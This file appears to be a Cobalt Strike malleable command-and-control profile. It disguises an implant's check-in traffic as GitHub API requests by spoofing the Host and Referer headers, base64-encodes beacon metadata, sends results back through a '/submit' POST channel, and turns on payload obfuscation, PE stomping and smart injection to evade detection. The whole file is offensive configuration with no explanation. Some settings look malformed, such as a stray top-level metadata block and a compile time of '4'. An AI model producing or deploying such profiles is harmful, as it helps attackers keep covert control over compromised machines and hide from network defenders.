set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
set sleeptime 60000;
set jitter 15;

set metadata {
    netbios;
    base64;
}

http-get {
  set uri "/repos/user/repo/contents/gjkggqliy";

  client {
    header "Host" "github.com";
    header "Accept" "*/*";
    header "Referer" "https://github.com/";
    metadata {
      base64;
    }
  }

  server {
    header "Content-Type" "application/octet-stream";
    output "base64";
  }
}

http-post {
  set uri "/submit";

  client {
    id {
      base64;
    }

    output {
      base64;
    }
  }

  server {
    header "Content-Type" "application/json";
    output "base64";
  }
}

stage {
    set stomppe "true";
    set smartinject "true";
    set userwx "false";
    set compile_time "4";
    set obfuscate "true";
}
